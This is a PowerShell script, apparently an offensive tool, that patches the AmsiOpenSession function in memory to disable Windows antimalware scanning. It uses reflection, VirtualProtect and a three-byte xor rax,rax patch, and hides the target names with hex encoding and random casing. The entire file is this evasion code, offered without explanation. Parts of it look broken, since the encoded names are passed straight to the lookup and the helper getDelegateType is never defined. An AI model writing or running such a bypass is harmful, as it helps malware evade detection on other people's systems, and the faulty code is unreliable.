function Get-VariableWithRandomCase {
    param($inputString)

    $outputString = ""
    foreach ($char in $inputString.ToCharArray()) {
        if (Get-Random -Minimum 0 -Maximum 2) {
            $outputString += $char.ToLower()
        } else {
            $outputString += $char.ToUpper()
        }
    }
    return $outputString
}

function StringToHex {
    param($string)

    $hexString = ""
    foreach ($char in $string.ToCharArray()) {
        $hexString += "{0:X2}" -f [int][char]$char
    }
    return $hexString
}

function lookFuncAddr {
    Param($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

$moduleNameHex = StringToHex "amsi.dll"
$functionNameHex = StringToHex "AmsiOpenSession"

$moduleName = Get-VariableWithRandomCase -inputString $moduleNameHex
$functionName = Get-VariableWithRandomCase -inputString $functionNameHex

[IntPtr]$amsiAddr = lookFuncAddr $moduleName $functionName
$oldProtect = 0

$vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr "kernel32.dll" "VirtualProtect"),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))


$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)

$3b = [Byte[]] (0x48, 0x31, 0xC0)  
[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)

$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)

